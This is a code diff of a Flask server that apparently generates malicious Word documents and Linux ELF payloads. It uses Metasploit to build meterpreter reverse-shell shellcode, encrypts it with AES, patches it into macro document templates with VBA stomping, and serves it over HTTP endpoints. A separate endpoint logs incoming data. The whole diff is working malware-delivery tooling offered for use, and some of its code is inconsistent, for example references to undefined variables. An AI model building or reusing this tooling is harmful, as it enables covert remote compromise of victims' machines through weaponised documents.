@@ -2,7 +2,9 @@ from Crypto.Hash import SHA256
 from Crypto.Random import get_random_bytes
 from Crypto.Protocol.KDF import PBKDF2
 from Crypto.Cipher import AES
+import Crypto
 from pathlib import Path
+import pathlib
 import base64
 import hashlib
 import ipaddress
@@ -27,7 +29,6 @@ import base64
 import random
 from flask import request
 from pymetasploit3.msfrpc import MsfRpcClient
-from pprint import pprint
 
 from flask import Flask, render_template, Blueprint, render_template_string, request, send_from_directory, send_file, \
     current_app, redirect
@@ -55,6 +56,11 @@ from oletools.olevba import decompress_stream, copytoken_help
 from pcodedmp.pcodedmp import getWord, getDWord
 
 logger = logging.getLogger(__name__)
+win = Blueprint('win', __name__)
+lin = Blueprint('lin', __name__)
+crypt = Blueprint('crypt', __name__)
+info = Blueprint('info', __name__)
+
 
 SAFE_ADAPTERS = {"tun0", "eth0", "wlan0", "lo"}
 
@@ -72,38 +78,6 @@ rest_PADDING = b"\x20"
 
 
 PAYLOAD_DIR = "payloads"
-
-
-BASIC_LISTENER_CONFIG = {
-    "PingbackSleep": 10,
-    "OverrideRequestHost": True,
-    "ReverseListenerBindAddress": "127.0.0.1",
-    "ReverseListenerBindPort": 50000,
-}
-
-
-LISTENER_CONFIGS = {
-    "PS_HTTPS": BASIC_LISTENER_CONFIG | {
-        "Payload": "windows/x64/meterpreter/reverse_winhttps",
-        "HttpProxyIE": False
-    },
-    "PS_TCP": BASIC_LISTENER_CONFIG | {
-        "Payload": "windows/x64/meterpreter/reverse_tcp"
-    },
-    "VBA_32": BASIC_LISTENER_CONFIG | {
-        "Payload": "windows/meterpreter/reverse_winhttps",
-        "HttpProxyIE": False
-    },
-    "VBA_64": BASIC_LISTENER_CONFIG | {
-        "Payload": "windows/x64/meterpreter/reverse_winhttps",
-        "HttpProxyIE": False
-    },
-    "ELF": BASIC_LISTENER_CONFIG | {
-        "Payload": "linux/x64/meterpreter_reverse_https"
-    },
-}
-pprint(LISTENER_CONFIGS)
-
 
 BASIC_LISTENER_CONFIG = {
     "PingbackSleep": 10,
@@ -144,8 +118,6 @@ for cfg in CFGS:
         if "winhttps" in full_payload:
             LISTENER_CONFIGS[key][arch]["HttpProxyIE"] = False
 
-pprint(LISTENER_CONFIGS)
-
 
 msf_client = None
 
@@ -169,11 +141,6 @@ with open('templates/WIN_DELEGATE.ps1', 'r') as f:
 
 with open('templates/WIN_VBA_OUT.ps1', 'r') as f:
     WIN_VBA_OUT_TEMPLATE = f.read().strip()
-
-
-win = Blueprint('win', __name__)
-lin = Blueprint('lin', __name__)
-info = Blueprint('info', __name__)
 
 
 def findmarker(content):
@@ -259,7 +226,6 @@ def open_word_template(template_path: str):
     file_data = BytesIO(template_file)
     ole = olefile.OleFileIO(file_data, write_mode=True)
 
-    # Parse the VBA dir to get a hold of the offsets
     if not ole.exists("Macros/VBA/dir"):
         logger.error(f"OLE dir Macros/VBA/dir does not exist")
         return None, None
@@ -300,19 +266,11 @@ def generate_word_file(template_path: str, encrypted_payloads: List[bytes], stom
         dir_stream = decompress_stream(ole.openstream("Macros/VBA/dir").read())
 
         module_offsets = get_vba_offsets(dir_stream)
-
-        # We have messed up the mapping between modules and OLE paths using EvilClippy, so pick the largest offset and put it in NewMacros
         biggest_offset = sorted(module_offsets.items(),
                                 key=lambda x: x[1], reverse=True)[0][1]
         contents = ole.openstream(f"Macros/VBA/NewMacros").read()
         contents = contents[:biggest_offset].ljust(len(contents), b'\x00')
         ole.write_stream(f"Macros/VBA/NewMacros", contents)
-
-        # for directory, vba_offset in module_offsets.items():
-        #     contents = ole.openstream(f"Macros/VBA/{directory}").read()
-        #     contents = contents[:vba_offset].ljust(len(contents), b'\x00')
-        #     ole.write_stream(f"Macros/VBA/{directory}", contents)
-
     ole.close()
     file_data.seek(0)
 
@@ -852,26 +810,6 @@ def gen_multiple_payloads(lhost, lport, proxy, id, config="windows_meterpreter_r
     return retval
 
 
-def msgbox_generator(archs=[32, 64]):
-    retval = {}
-    for i in archs:
-        payload = "windows/x64/messagebox"
-        if archs == 32:
-            payload = "windows/messagebox"
-        retval[i] = generate_payload(
-            payload,
-            None,
-            None,
-            'raw',
-            [
-                {
-                    "Title": f"{str(i)} bit"
-                }
-            ]
-        )
-    return retval
-
-
 def openssl_pbkdf2_encrypt(plaintext: bytes, password: str) -> bytes:
     salt = get_random_bytes(8)
     key_iv = PBKDF2(password.encode(), salt, dkLen=48,
@@ -893,28 +831,33 @@ def patch_document(doc_path: Path, shellcode_path: Path, out_path: Path, passwor
 
     print(
         f"[+] Loaded {len(raw_shellcode)} bytes of shellcode from '{shellcode_path}'.")
+    print(f"{password=}")
 
     b64_payload = openssl_pbkdf2_encrypt(raw_shellcode, password)
 
     egg_start_idx = doc_data.find(EGG_START)
     if egg_start_idx == -1:
         raise ValueError("START_AES_HERE marker not found")
+
     egg_end_idx = doc_data.find(EGG_END, egg_start_idx)
     if egg_end_idx == -1:
         raise ValueError("_END_AES_HERE marker not found")
 
+    egg_end_idx += len(EGG_END)
     egg_region_len = egg_end_idx - egg_start_idx
+
     if len(b64_payload) > egg_region_len:
         raise ValueError(
             f"Encrypted payload ({len(b64_payload)} B) exceeds region ({egg_region_len} B)"
         )
 
-    padded_payload = b64_payload + first_PADDING + \
-        rest_PADDING * (egg_region_len - len(b64_payload) - 1)
+    padding_len = egg_region_len - len(b64_payload)
+    padded_payload = b64_payload + rest_PADDING * padding_len
+
     patched = (
-        doc_data[:egg_start_idx]
-        + padded_payload
-        + doc_data[egg_end_idx:]
+        doc_data[:egg_start_idx] +
+        padded_payload +
+        doc_data[egg_end_idx:]
     )
 
     b64_pass = base64.b64encode(password.encode())
@@ -922,25 +865,26 @@ def patch_document(doc_path: Path, shellcode_path: Path, out_path: Path, passwor
     pwd_start_idx = patched.find(PWD_START)
     if pwd_start_idx == -1:
         raise ValueError("PASSWORD_START_ marker not found")
+
     pwd_end_idx = patched.find(PWD_END, pwd_start_idx)
     if pwd_end_idx == -1:
         raise ValueError("_PASSWORD_STOP marker not found")
 
-    pwd_region_start = pwd_start_idx
-    pwd_region_end = pwd_end_idx + len(PWD_END)
-    pwd_region_len = pwd_region_end - pwd_region_start
+    pwd_end_idx += len(PWD_END)
+    pwd_region_len = pwd_end_idx - pwd_start_idx
 
     if len(b64_pass) > pwd_region_len:
         raise ValueError(
             f"Base‑64 password ({len(b64_pass)} B) exceeds region ({pwd_region_len} B)"
         )
 
-    padded_b64_pass = b64_pass + first_PADDING + \
-        rest_PADDING * (pwd_region_len - len(b64_pass) - 1)
+    pwd_padding_len = pwd_region_len - len(b64_pass)
+    padded_b64_pass = b64_pass + rest_PADDING * pwd_padding_len
+
     patched = (
-        patched[:pwd_region_start]
-        + padded_b64_pass
-        + patched[pwd_region_end:]
+        patched[:pwd_start_idx] +
+        padded_b64_pass +
+        patched[pwd_end_idx:]
     )
 
     out_path.write_bytes(patched)
@@ -951,7 +895,7 @@ def patch_document(doc_path: Path, shellcode_path: Path, out_path: Path, passwor
     )
 
 
-def generate_encrypted_payload(id: str, lhost: str, lport: int, password: str, arch: int = 32, proxy: bool = False) -> bytes:
+def generate_encrypted_payload(id: str, lhost: str, lport: int, password: str, arch: int = 32, proxy: bool = False, payload_type: str = "windows_meterpreter_reverse_winhttps") -> bytes:
     """
     Genereer AES-versleutelde payload (Base64) op basis van ID, arch, host, etc.
     """
@@ -960,7 +904,7 @@ def generate_encrypted_payload(id: str, lhost: str, lport: int, password: str, a
         raise ValueError("Invalid id")
 
     payloads = gen_multiple_payloads(
-        lhost, lport, proxy, clean_id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[arch]
+        lhost, lport, proxy, clean_id, config=payload_type, endpoint="ms", archs=[arch]
     )
 
     raw_bytes = payloads[arch]
@@ -971,39 +915,29 @@ def generate_encrypted_payload(id: str, lhost: str, lport: int, password: str, a
     return openssl_pbkdf2_encrypt(raw_bytes, password)
 
 
-@win.route('/aes/get', methods=['GET', 'POST'])
-def aes_payload():
-    password = request.args.get('password')
-    lhost = request.args.get('lhost')
-    lport = int(request.args.get('lport'))
-    architecture = int(request.args.get('architecture', 32))
-    id = request.args.get('id')
-    proxy = ('system_proxy' in request.form.keys()
-             or 'system_proxy' in request.args.keys())
-
-    if not all([password, lhost, lport, id]):
-        return "Missing parameters", 400
-
-    try:
-        encrypted_blob = generate_encrypted_payload(
-            id=id,
-            lhost=lhost,
-            lport=lport,
-            password=password,
-            arch=architecture,
-            proxy=proxy
-        )
-        return encrypted_blob
-    except Exception as e:
-        return str(e), 500
+def generate_encrypted_payloads(id: str, lhost: str, lport: int, password: str, archs: list = [32, 64], proxy: bool = False, payload_type: str = "windows_meterpreter_reverse_winhttps") -> dict:
+    retval = {}
+    for i in archs:
+        retval[i] = openssl_pbkdf2_encrypt(generate_encrypted_payload(
+            id, lhost, lport, password, archs=int(i), proxy=proxy, payload_type=payload_type))
+    return retval
 
 
-def generate_word_file_aes(template_path: str, encrypted_payloads: List[bytes], stomp_vba: bool = False) -> Optional[BytesIO]:
+def generate_word_file_aes(lhost, lport, proxy, id, template_path: str, stomp_vba: bool = False) -> Optional[BytesIO]:
     """
     Patch a Word document using AES encryption. The first entry in `encrypted_payloads` must be a bytes blob or filename.
     """
     from tempfile import NamedTemporaryFile
     import uuid
+    payloads = gen_multiple_payloads(
+        lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64]
+    )
+    payload_path_32 = f"{PAYLOAD_DIR}/{payloads[32]}"
+    with open(payload_path_32, "rb") as f:
+        payload_bytes_32 = f.read()
+    payload_path_64 = f"{PAYLOAD_DIR}/{payloads[64]}"
+    with open(payload_path_64, "rb") as f:
+        payload_path_64 = f.read()
 
     payload_entry = encrypted_payloads[0]
 
@@ -1018,12 +952,12 @@ def generate_word_file_aes(template_path: str, encrypted_payloads: List[bytes], 
     password = str(uuid.uuid4()).replace('-', '')
 
     with NamedTemporaryFile(delete=False) as shellcode_file:
-        shellcode_path = Path(shellcode_file.name)
+        shellcode_path = pathlib.Path(shellcode_file.name)
         shellcode_file.write(shellcode)
 
-    doc_path = Path(template_path)
+    doc_path = pathlib.Path(template_path)
     with NamedTemporaryFile(delete=False) as output_file:
-        output_path = Path(output_file.name)
+        output_path = pathlib.Path(output_file.name)
 
     patch_document(doc_path, shellcode_path, output_path, password)
 
@@ -1053,17 +987,9 @@ def word_get():
         word_file_stream = generate_word_file(
             template_path, [encrypt_raw_payload(payloads[32]), encrypt_raw_payload(payloads[64])], stomp_vba)
     elif payload_type == "aes_shellcode_revshell":
-        payloads = gen_multiple_payloads(
-            lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32]
-        )
-
-        payload_path_32 = f"{PAYLOAD_DIR}/{payloads[32]}"
-        with open(payload_path_32, "rb") as f:
-            payload_bytes_32 = f.read()
-
         template_path = "/mnt/exploits/vba/template/eas_encrypted_shellcode.doc"
         word_file_stream = generate_word_file_aes(
-            template_path, [payload_bytes_32], stomp_vba
+            lhost, lport, proxy, id, template_path, stomp_vba
         )
 
     elif payload_type == "aes_shellcode_pingback":
@@ -1074,7 +1000,8 @@ def word_get():
         encrypted_bytes_64 = payloads[64]
         template_path = "/mnt/exploits/vba/template/eas_encrypted_shellcode.doc"
         word_file_stream = generate_word_file(
-            template_path, [encrypted_bytes_32, encrypted_bytes_64], stomp_vba)
+            template_path, [encrypted_bytes_32, encrypted_bytes_64], stomp_vba
+        )
     else:
         return "Invalid type", 400
 
@@ -1145,7 +1072,7 @@ def lin_form():
     return template
 
 
-def gen_multiple_payloads_linux(lhost, lport, clean_id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", arch=64):
+def gen_multiple_payloads_linux(lhost, lport, clean_id, config="linux_meterpreter_reverse_https", endpoint="ms", arch=64):
     setup_listener(
         lhost,
         lport,
@@ -1170,7 +1097,7 @@ def gen_multiple_payloads_linux(lhost, lport, clean_id, config="windows_meterpre
 
 def generate_elf_internal(lhost, lport, clean_id):
     payloads_generated = gen_multiple_payloads_linux(
-        lhost, lport, clean_id, config="linux_meterpreter_reverse_https", endpoint="ms", arch=64
+        lhost, lport, clean_id
     )
     return payloads_generated
 
@@ -1230,7 +1157,7 @@ def generate_elf_fee():
     ).strip()
 
 
-@info.route('/get', methods=['GET', 'POST'])
+@info.route('/', methods=['GET', 'POST'])
 def receive_info():
     if request.form:
         current_app.logger.info(f"Received info: {request.form}")
@@ -1238,12 +1165,70 @@ def receive_info():
     return "Thanks", 200
 
 
+@crypt.route('/aes/get', methods=['GET', 'POST'])
+def aes_payload():
+    password = request.args.get('password')
+    string_to_encrypt = request.args.get('string_to_encrypt', '')
+    lhost = request.args.get('lhost')
+    lport = request.args.get('lport', "443")
+    payload_type = request.args.get('payload_type', "443")
+    architecture = int(request.args.get('architecture', 64))
+    id = request.args.get('id')
+    proxy = ('system_proxy' in request.form.keys()
+             or 'system_proxy' in request.args.keys())
+
+    if not all([password, lhost, lport, id]):
+        return "?password=some-password&lport=443&lhost=tun0&architecture=64&id=test&(optional string_to_encrypt=Hello World)&(optional proxy)", 400
+
+    if string_to_encrypt != '':
+        encrypted_blob = openssl_pbkdf2_encrypt(
+            string_to_encrypt.encode('latin-1'), password)
+        return encrypted_blob
+    else:
+        encrypted_blob = generate_encrypted_payload(
+            id=id,
+            lhost=lhost,
+            lport=int(lport),
+            password=password,
+            arch=architecture,
+            proxy=proxy
+        )
+        return encrypted_blob
+
+
 app = Flask(__name__)
 app.register_blueprint(win, url_prefix='/p/win')
 app.register_blueprint(lin, url_prefix='/p/lin')
 app.register_blueprint(info, url_prefix='/p/info')
+app.register_blueprint(crypt, url_prefix='/p/crypt')
 
 print(app.url_map)
 
 if __name__ == '__main__':
+    import os
+    import uuid
+    import subprocess
+
+    cert_dir = './certs'
+    key_path = os.path.join(cert_dir, 'cert.key')
+    crt_path = os.path.join(cert_dir, 'cert.crt')
+
+    if not os.path.exists(key_path):
+        os.makedirs(cert_dir, exist_ok=True)
+        cn = f"cert-{uuid.uuid4().hex}"
+        cmd = [
+            "openssl", "req", "-x509",
+            "-newkey", "rsa:2048",
+            "-keyout", key_path,
+            "-out", crt_path,
+            "-days", "365",
+            "-nodes",
+            "-subj", f"/CN={cn}"
+        ]
+        subprocess.run(cmd, check=True)
+    print("Don't forget to run nginx:")
+    print("*" * 50)
+    print("sudo pkill nginx ; sudo nginx -c /opt/loader/nginx2.conf")
+    print("*" * 50)
     app.run(host='127.0.0.1', port=50101, debug=True)
+    password = str(uuid.uuid4()).replace('-', '')
